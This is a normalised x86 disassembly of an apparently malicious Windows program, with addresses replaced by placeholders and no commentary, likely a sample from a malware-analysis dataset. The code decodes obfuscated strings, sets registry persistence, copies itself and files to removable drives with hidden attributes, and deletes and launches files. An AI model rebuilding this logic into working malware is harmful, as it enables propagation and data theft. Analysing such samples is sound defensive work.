sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_413190
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
call sub_401090
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
call sub_4015b0
sub_401060
push esi
mov esi [ esp + 0xc ]
xor eax eax
test esi esi
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
mov dl [ eax + ecx ]
sub dl al
xor dl 0xb
sub dl 0x7
mov [ eax + ecx ] dl
inc eax
cmp eax esi
jl r-xdata
sub_401090
push ecx
push ebx
push ebp
push esi
push edi
push 0x8007
call [ SetErrorMode@IAT ]
push 0x6
push rw-data
call sub_401060
push 0x11
push rw-data
call sub_401060
push 0x10
push rw-data
call sub_401060
push 0x9
push rw-data
call sub_401060
push 0x4
push rw-data
call sub_401060
push 0x9
push rw-data
call sub_401060
push 0xc
push rw-data
call sub_401060
push 0x11
push rw-data
call sub_401060
add esp 0x40
push 0x2c
push rw-data
call sub_401060
push 0x19
push rw-data
call sub_401060
push 0x10
push rw-data
call sub_401060
push 0x12
push rw-data
call sub_401060
push 0xe
push rw-data
call sub_401060
push 0x11
push rw-data
call sub_401060
push 0x13
push rw-data
call sub_401060
push 0x17
push rw-data
call sub_401060
add esp 0x40
push 0x3
push rw-data
call sub_401060
push 0x4
push rw-data
call sub_401060
push 0x8
push rw-data
call sub_401060
push 0x5
push rw-data
call sub_401060
push 0xb
push rw-data
call sub_401060
push 0xc
push rw-data
call sub_401060
push 0xd
push rw-data
call sub_401060
push 0x11
push rw-data
call sub_401060
add esp 0x40
push 0x20
push rw-data
call sub_401060
push 0x8
push rw-data
call sub_401060
push 0xd
push rw-data
call sub_401060
push 0x8
push rw-data
call sub_401060
add esp 0x20
mov esi rw-data
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
call sub_401060
add esi 0x10
add esp 0x8
cmp esi rw-data
jl r-xdata
mov ebp [ LoadLibraryA@IAT ]
push rw-data
call ebp
mov edi [ GetProcAddress@IAT ]
mov esi eax
push rw-data
push esi
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
mov ebx [ FreeLibrary@IAT ]
push esi
mov [ rw-data ] eax
call ebx
push rw-data
call ebp
mov esi eax
test esi esi
jne r-xdata
push rw-data
push esi
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push esi
mov [ rw-data ] eax
call ebx
push 0x1
call sub_401810
mov esi [ CreateEventA@IAT ]
add esp 0x4
push rw-data
push 0x0
push 0x0
push 0x0
call esi
push rw-data
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_401430
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
call sub_401540
push 0x0
push 0x5
push rw-data
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
or ecx 0xffffffff
mov edi rw-data
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
push rw-data
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
push rw-data
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_40c272
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
call sub_40c272
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
call sub_40c272
add esp 0x38
push rw-data
call [ DeleteFileA@IAT ]
push rw-data
call sub_403380
push rw-data
call sub_403380
add esp 0x8
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push 0x0
push sub_402fb0
push 0x0
push 0x0
call [ CreateThread@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_401450
sub esp 0x88
push esi
xor esi esi
lea eax [ esp + 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
mov [ esp + 0x2c ] 0x80
call [ RegCreateKeyExA@IAT ]
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push ecx
push edx
push esi
push esi
push rw-data
push eax
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov al [ esp + 0xc ]
test al al
je r-xdata
mov edx [ esp ]
mov [ esp + eax + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
push eax
push ecx
push 0x1
push 0x0
push rw-data
push edx
call [ RegSetValueExA@IAT ]
add esp 0x88
retn
inc cl
mov [ esp + eax + 0x8 ] cl
mov cl [ eax + rw-data ]
inc eax
test cl cl
jne r-xdata
mov [ esi + rw-data ] 0x0
jmp r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ esp + esi + 0xd ]
inc esi
test al al
jne r-xdata
mov cl [ rw-data ]
xor eax eax
test cl cl
pop esi
je r-xdata
sub_401540
push rw-data
push 0x0
push 0x1f0001
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
push rw-data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
call sub_401450
push rw-data
push rw-data
call sub_4060a0
add esp 0x8
retn
push eax
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
push 0x1388
push ecx
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
sub_4015b0
push ecx
push esi
call sub_405900
test eax eax
je r-xdata
mov esi [ CreateThread@IAT ]
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x0
push sub_401760
push 0x0
push 0x0
call esi
lea ecx [ esp + 0x4 ]
push ecx
push 0x0
push 0x0
push sub_401610
push 0x0
push 0x0
call esi
mov esi [ Sleep@IAT ]
call sub_4023d0
call sub_401780
push 0x3e8
call esi
jmp r-xdata
sub_401610
sub esp 0x30c
push ebx
push ebp
push esi
push edi
push 0x14
call [ Sleep@IAT ]
jmp r-xdata
mov al [ esp + 0x11c ]
test al al
je r-xdata
lea eax [ esp + 0x11c ]
xor esi esi
push eax
push 0x200
mov [ esp + 0x18 ] esi
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea ebx [ esp + esi + 0x11c ]
or ecx 0xffffffff
mov edi ebx
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
movsx ecx [ ebx ]
push ecx
inc ebp
call sub_40c2c4
add esp 0x4
push ebx
call [ GetDriveTypeA@IAT ]
movsx edx [ ebx ]
push edx
mov edi eax
call sub_40c2c4
add esp 0x4
cmp eax 0x43
jge r-xdata
lea eax [ esp + 0x14 ]
push 0x0
push eax
push 0x0
push ebx
call [ GetDiskFreeSpaceExA@IAT ]
cmp edi 0x2
je r-xdata
add esi ebp
mov [ esp + 0x10 ] esi
jmp r-xdata
cmp [ esp + 0x18 ] 0x2
jb r-xdata
cmp edi 0x3
jne r-xdata
mov al [ esp + esi + 0x11c ]
test al al
jne r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x1c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x1c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ PathFileExistsA@IAT ]
test eax eax
jne r-xdata
ja r-xdata
add esi ebp
mov [ esp + 0x10 ] esi
jmp r-xdata
mov eax [ esp + 0x10 ]
add eax ebp
mov [ esp + 0x10 ] eax
mov esi eax
push ebx
call sub_401950
add esp 0x4
cmp [ esp + 0x14 ] 0x540be400
jbe r-xdata
sub_401780
sub esp 0x200
push ebx
xor ebx ebx
push ebx
call sub_401810
add esp 0x4
lea eax [ esp + 0x4 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
pop ebx
add esp 0x200
retn
mov al [ esp + 0x4 ]
test al al
je r-xdata
push esi
push edi
lea esi [ esp + 0xc ]
add ebx edi
mov al [ esp + ebx + 0xc ]
lea esi [ esp + ebx + 0xc ]
test al al
jne r-xdata
push eax
call sub_401920
add esp 0x4
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
movsx ecx [ esi ]
push ecx
inc edi
call sub_40c2c4
add esp 0x4
cmp eax 0x43
jl r-xdata
pop edi
pop esi
push esi
call sub_401950
add esp 0x4
sub_401810
mov eax [ esp + 0x4 ]
sub esp 0x208
push ebx
xor ebx ebx
test eax eax
push edi
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
mov ecx 0x18
xor eax eax
mov edi rw-data
[ edi ]
pop edi
pop ebx
add esp 0x208
retn
mov al [ esp + 0x10 ]
test al al
je r-xdata
mov eax [ esp + 0x214 ]
xor ecx ecx
cmp eax ecx
jne r-xdata
push ebp
push esi
lea esi [ esp + 0x18 ]
xor eax eax
add ebx ebp
mov al [ esp + ebx + 0x18 ]
lea esi [ esp + ebx + 0x18 ]
test al al
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
je r-xdata
add eax 0x4
cmp eax 0x60
jl r-xdata
cmp [ eax + rw-data ] ecx
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
movsx ecx [ esi ]
push ecx
inc ebp
call sub_40c2c4
mov edi eax
add esp 0x4
cmp edi 0x43
jl r-xdata
pop esi
pop ebp
mov eax [ esp + 0x21c ]
test eax eax
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ eax + rw-data ] ecx
je r-xdata
mov [ eax + rw-data ] ecx
lea edx [ esp + 0x10 ]
push 0x0
push edx
push 0x0
push esi
mov [ edi * 4 + rw-data ] edi
call [ GetDiskFreeSpaceExA@IAT ]
cmp [ esp + 0x14 ] 0x2
ja r-xdata
mov [ edi * 4 + rw-data ] edi
jmp r-xdata
jb r-xdata
mov [ edi * 4 + rw-data ] 0x0
cmp [ esp + 0x10 ] 0x540be400
jae r-xdata
sub_401920
mov eax [ esp + 0x4 ]
mov edx [ eax * 4 + rw-data ]
lea ecx [ eax * 4 + rw-data ]
test edx edx
jne r-xdata
xor eax eax
retn
mov edx [ eax * 4 + rw-data ]
test edx edx
je r-xdata
mov [ ecx ] eax
mov eax 0x1
retn
sub_401950
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
push 0x5c
push esi
mov [ rw-data ] 0x1
call sub_40c390
add esp 0x8
test eax eax
je r-xdata
push esi
call sub_4019a0
push esi
call sub_401c00
add esp 0x8
mov [ rw-data ] 0x0
pop esi
mov [ eax ] 0x0
sub_4019a0
sub esp 0x840
lea eax [ esp + 0x240 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x850 ]
push edi
push rw-data
push rw-data
push rw-data
push esi
push rw-data
push eax
call sub_40c272
push rw-data
push rw-data
push esi
lea ecx [ esp + 0x474 ]
push rw-data
push ecx
call sub_40c272
push rw-data
push rw-data
push esi
lea edx [ esp + 0x688 ]
push rw-data
push edx
call sub_40c272
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x40
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x50 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x50 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
mov ebp [ CopyFileA@IAT ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x54 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x258 ]
push ecx
call ebp
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x50 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea edx [ esp + 0x50 ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x54 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x458 ]
push ecx
call ebp
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x840
retn
lea edx [ esp + 0x50 ]
push rw-data
push edx
call sub_40c515
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push esi
push 0x40
lea eax [ esp + 0x18 ]
push 0x1
push eax
call sub_40c40d
push esi
mov [ esp + eax + 0x24 ] 0x0
call sub_40c3b7
add esp 0x14
mov esi rw-data
lea eax [ esp + 0x10 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x50 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x50 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x54 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x658 ]
push ecx
call ebp
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
lea edx [ esp + 0x50 ]
push edx
call sub_402220
add esp 0x4
push 0x7d0
call [ Sleep@IAT ]
lea eax [ esp + 0x50 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea ecx [ esp + 0x50 ]
push ecx
call [ DeleteFileA@IAT ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_401c00
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push esi
push edi
mov edi [ esp + 0x410 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0xc ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x20c ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xc ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x20c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_403380
lea ecx [ esp + 0x210 ]
push rw-data
push ecx
call sub_40c515
mov esi eax
add esp 0xc
test esi esi
je r-xdata
lea edx [ esp + 0x20c ]
push edx
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ esp + 0x210 ]
push eax
call [ SetFileAttributesA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xc ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_403380
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call sub_401db0
add esp 0xc
pop edi
pop esi
pop ebx
add esp 0x400
retn
push esi
push 0x1
push 0x11
push rw-data
call sub_40c528
push esi
push 0x1
push 0x2
push rw-data
call sub_40c528
push esi
push 0x1
push 0x2c
push rw-data
call sub_40c528
push esi
call sub_40c3b7
add esp 0x34
sub_401db0
sub esp 0x94c
mov eax [ esp + 0x950 ]
push ebp
push esi
push edi
push eax
lea ecx [ esp + 0x75c ]
push rw-data
push ecx
call sub_40c272
add esp 0xc
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x758 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0xc ] eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x94c
retn
mov ebp [ esp + 0x960 ]
mov esi [ esp + 0xc ]
lea eax [ esp + 0x18 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea edi [ esp + 0x44 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x258 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x95c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x558 ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x258 ]
push ecx
push edx
push rw-data
push eax
call sub_40c272
lea ecx [ esp + 0x268 ]
lea edx [ esp + 0x368 ]
push ecx
push ebp
push rw-data
push edx
call sub_40c272
mov al [ esp + 0x38 ]
add esp 0x20
test al 0x10
je r-xdata
push esi
call [ FindClose@IAT ]
jmp r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x158 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x15c ]
push ecx
call sub_40c650
add esp 0x8
test eax eax
je r-xdata
lea eax [ esp + 0x358 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea ecx [ esp + 0x358 ]
lea edx [ esp + 0x558 ]
push ecx
push edx
call sub_401db0
add esp 0x8
test eax eax
je r-xdata
cmp [ esp + 0x44 ] 0x2e
je r-xdata
push 0x0
lea edx [ esp + 0x14 ]
push 0x0
lea eax [ esp + 0x160 ]
push edx
push eax
call [ GetDiskFreeSpaceExA@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
ja r-xdata
mov [ eax + 0x1 ] 0x0
mov ecx [ esp + 0xc ]
push ecx
call [ FindClose@IAT ]
jmp r-xdata
lea ecx [ esp + 0x358 ]
push 0x0
lea edx [ esp + 0x55c ]
push ecx
push edx
call [ CopyFileA@IAT ]
cmp [ esp + 0x10 ] 0x4c4b40
jb r-xdata
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x94c
retn
sub_401f80
push esi
push rw-data
call sub_403380
mov esi [ esp + 0xc ]
push 0x5c
push esi
call sub_40c390
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_401fb0
add esp 0x4
pop esi
retn
mov [ eax ] 0x0
sub_401fb0
sub esp 0xa64
mov eax [ esp + 0xa68 ]
push ebx
push ebp
push esi
push edi
push eax
lea ecx [ esp + 0x478 ]
push rw-data
push ecx
call sub_40c272
add esp 0xc
lea edx [ esp + 0x34 ]
lea eax [ esp + 0x474 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
push rw-data
call sub_4033b0
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa64
retn
mov ebx [ Sleep@IAT ]
mov ebp [ FileTimeToSystemTime@IAT ]
mov al [ rw-data ]
test al 0x1
jne r-xdata
lea edi [ esp + 0x60 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x174 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0xa78 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x274 ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x174 ]
push ecx
push edx
push rw-data
push eax
call sub_40c272
mov al [ esp + 0x44 ]
add esp 0x10
test al 0x10
je r-xdata
call [ GetTickCount@IAT ]
mov esi [ rw-data ]
mov ecx eax
sub ecx esi
cmp ecx 0x64
jbe r-xdata
or al 0x1
mov [ rw-data ] al
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov eax [ esp + 0x54 ]
mov esi eax
shr esi 0xa
test eax 0x3ff
je r-xdata
push 0x64
call ebx
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x38 ]
push ecx
push edx
call ebp
mov eax [ esp + 0x1e ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x1a ]
and eax 0xffff
and ecx 0xffff
push eax
mov eax [ esp + 0x1a ]
push ecx
mov ecx [ esp + 0x1c ]
and edx 0xffff
and eax 0xffff
push edx
and ecx 0xffff
push eax
lea edx [ esp + 0x184 ]
push ecx
push edx
lea eax [ esp + 0x68c ]
push rw-data
push eax
call sub_40c272
lea ecx [ esp + 0x694 ]
push ecx
call sub_4033b0
push rw-data
call sub_4033b0
lea edx [ esp + 0x29c ]
push edx
call sub_401fb0
add esp 0x2c
test eax eax
je r-xdata
mov esi [ esp + 0x10 ]
lea edx [ esp + 0x34 ]
push edx
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push 0xa
mov [ rw-data ] eax
call ebx
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x48 ]
push eax
push ecx
call ebp
mov edx [ esp + 0x2e ]
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x2a ]
and edx 0xffff
and eax 0xffff
push edx
mov edx [ esp + 0x2a ]
push eax
mov eax [ esp + 0x2c ]
and ecx 0xffff
and edx 0xffff
push ecx
and eax 0xffff
push edx
push eax
lea ecx [ esp + 0x188 ]
push esi
push ecx
lea edx [ esp + 0x690 ]
push rw-data
push edx
call sub_40c272
lea eax [ esp + 0x698 ]
push eax
call sub_4033b0
push rw-data
call sub_4033b0
add esp 0x2c
inc esi
mov eax [ esp + 0x10 ]
push eax
call [ FindClose@IAT ]
push rw-data
call sub_4033b0
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa64
retn
jmp r-xdata
push esi
call [ FindClose@IAT ]
jmp r-xdata
cmp [ esp + 0x60 ] 0x2e
je r-xdata
sub_402220
sub esp 0x254
push ebp
mov ebp [ esp + 0x25c ]
push edi
push rw-data
push ebp
call sub_40c710
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x18 ]
lea edx [ esp + 0x18 ]
[ edi ]
lea ecx [ esp + 0x8 ]
mov [ esp + 0x44 ] 0x1
push ecx
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push ebp
push eax
mov [ esp + 0x70 ] ax
call [ CreateProcessA@IAT ]
pop edi
pop ebp
add esp 0x254
retn
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push esi
lea edx [ esp + 0x60 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push 0x22
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x64 ]
push ecx
call sub_40c650
add esp 0x8
test eax eax
pop esi
je r-xdata
inc eax
push 0x22
push eax
call sub_40c650
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x5c ]
push 0x5c
push edx
mov [ eax ] 0x0
call sub_40c390
add esp 0x8
test eax eax
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x1 ] 0x0
jmp r-xdata
lea eax [ esp + 0x5d ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_402300
sub esp 0x200
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push esi
push edi
mov edi rw-data
push 0x5c
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
push ecx
call sub_40c390
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x200
retn
mov [ eax ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebx
lea edx [ esp + 0xc ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
push rw-data
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ DeleteFileA@IAT ]
call esi
lea eax [ esp + 0xc ]
push eax
call esi
call sub_4033f0
call sub_403470
call sub_4039e0
call sub_403d50
lea ecx [ esp + 0xc ]
push ecx
push rw-data
call sub_40c790
lea edx [ esp + 0x14 ]
push edx
call sub_402a60
add esp 0xc
lea eax [ esp + 0xc ]
push eax
call esi
pop ebx
sub_4023d0
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push esi
push edi
mov edi rw-data
push 0x5c
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
push ecx
call sub_40c390
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x400
retn
push ebx
push ebp
lea edx [ esp + 0x10 ]
mov [ eax ] 0x0
push rw-data
push edx
lea eax [ esp + 0x18 ]
push rw-data
push eax
call sub_40c272
mov ebp [ DeleteFileA@IAT ]
add esp 0x10
push rw-data
call ebp
lea ecx [ esp + 0x10 ]
push ecx
call ebp
lea edx [ esp + 0x210 ]
xor ebx ebx
push edx
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call sub_40c790
lea edx [ esp + 0x18 ]
push edx
call sub_402a60
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
call ebp
pop ebp
pop ebx
mov al [ esp + 0x210 ]
test al al
je r-xdata
lea esi [ esp + ebx + 0x210 ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
movsx eax [ esi ]
not ecx
dec ecx
push eax
mov edi ecx
inc edi
call sub_40c2c4
add esp 0x4
cmp eax 0x43
jl r-xdata
add ebx edi
mov al [ esp + ebx + 0x210 ]
test al al
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x5
je r-xdata
push esi
call sub_4033b0
push rw-data
call sub_4033b0
push esi
call sub_401f80
add esp 0xc
sub_402500
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
